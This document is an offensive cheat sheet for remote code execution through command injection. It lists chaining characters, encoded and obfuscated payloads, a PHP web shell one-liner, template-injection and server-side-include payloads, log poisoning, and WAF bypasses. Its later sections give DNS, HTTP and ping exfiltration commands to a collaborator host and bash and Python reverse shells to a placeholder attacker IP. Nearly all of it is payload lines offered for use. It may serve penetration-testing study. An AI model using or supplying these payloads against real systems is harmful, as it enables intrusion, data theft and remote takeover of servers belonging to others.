**1. General Tips for RCE Exploitation**

- **Characters for Command Injection** : Use characters like `;`, `|`, `&`, `&&`, `||`, `\n`,$() (newline), and others to chain or separate commands.
    - Example: `; whoami`
    - Example: `&& whoami`
    - Example: `| whoami`
- **Output Redirection** :
    - If direct command execution isn't possible, try redirecting output to a file you can access.
        - Example: `whoami > output.txt`
    - Ensure the file path is writable by the application.
- **End Commands with Separators** :
    - End your injected command with `&`, `;`, or similar to ensure subsequent input doesn't invalidate your payload.
        - Example: `whoami &`
- **Blind RCE** :
    - If you cannot see the output directly, use blind techniques:
        - **Ping** : `ping -c 1 <collaborator-domain>` or `ping -n 1 <collaborator-domain>`
        - **DNS Exfiltration** : `nslookup $(whoami).<collaborator-domain>`
        - **HTTP Requests** : `curl <http://$>(whoami).<collaborator-domain>`

---

## **2. Ways of Injecting OS Commands**

### **Command Separators**

Use these characters to chain multiple commands together:

- **Cross-Platform** :
    - `&`: Runs the next command regardless of the success of the previous one.
    - `&&`: Runs the next command only if the previous one succeeds.
    - `|`: Pipes the output of the first command into the second.
    - `||`: Runs the next command only if the previous one fails.
- **Unix-Based Systems Only** :
    - `;`: Separates commands sequentially.
    - Newline (`\\n`): Executes commands line by line.

### **Inline Execution**

On Unix-based systems, use these techniques to execute commands inline within another command:

- Backticks: `injected command`
    - Example: `whoami`
- Dollar Parentheses: `$(` injected command `)`
    - Example: `$(whoami)`

---

## **3. Advanced RCE Techniques**

### **Shell Escape Sequences**

If the application escapes certain characters, try bypassing them using encoding or alternative syntax:

- **Encoding** :
    - URL encode special characters (e.g., `%3B` for `;`).
    - Base64 encode payloads and decode them on the server:
        - Example: `echo d2hvYW1p | base64 -d | bash`
- **Using Variables** :
    - Use environment variables or aliases to bypass filters:
        - Example: `bash -c $'whoami'`
        - Example: `$(echo -e "whoami")`

### **File Uploads**

Leverage file upload functionality to achieve RCE:

- Upload a malicious file (e.g., `.php`, `.jsp`) and execute it via a web shell.
- Example PHP payload: `<?php system($_GET['cmd']); ?>`

### **Deserialization Vulnerabilities**

Exploit deserialization flaws in frameworks or libraries to execute arbitrary code:

- Craft serialized payloads that trigger RCE when deserialized.
- Tools like `ysoserial` (Java) can help generate payloads.

### **Template Injection**

Inject payloads into templating engines (e.g., Jinja2, Twig):

- Example: `{{ self.__init__.__globals__['os'].popen('whoami').read() }}`

### **Server-Side Includes (SSI)**

Inject SSI directives to execute commands:

- Example: `<!--#exec cmd="whoami" -->`

### **Log Poisoning**

Inject malicious payloads into logs and access them via an exposed log viewer:

- Example: Inject `<?php system('whoami'); ?>` into HTTP headers or user input.

---

## **4. Bypass Filters and WAFs**

### **Basic Bypasses**

- Use case variations to bypass simple filters:
    - Example: `WhOaMi`
- Use Unicode or encoded characters:
    - Example: `\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069` → `whoami`

### **Advanced Bypasses**

- **Null Byte Injection** :
    - Add a null byte (`%00`) to terminate strings prematurely:
        - Example: `whoami%00`
- **Double Encoding** :
    - Encode special characters twice:
        - Example: `%253B` → `;`
- **Obfuscation** :
    - Use built-in commands or aliases to obfuscate payloads:
        - Example: `/bin/sh -c id`
        - Example: `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1`

---

## **5. Data Exfiltration Techniques**

### **DNS Exfiltration**

- Use DNS queries to send data to a Collaborator server:
    - Example: `nslookup $(whoami).<collaborator-domain>`

### **HTTP Exfiltration**

- Send data via HTTP requests:
    - Example: `curl http://<collaborator-domain>/?data=$(whoami)`

### **Ping Tunneling**

- Use ICMP packets to exfiltrate data:
    - Example: `ping -p $(whoami | xxd -p) <collaborator-ip>`

---

## **6. Common Tools for RCE**

- **Burp Suite** :
    - Use Burp Collaborator to capture DNS/HTTP interactions.
- **Netcat** :
    - Set up a listener to catch reverse shells:
        - Example: `nc -lvnp 4444`
- **Reverse Shell Payloads** :
    - Bash: `bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1`
    - Python: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker-ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`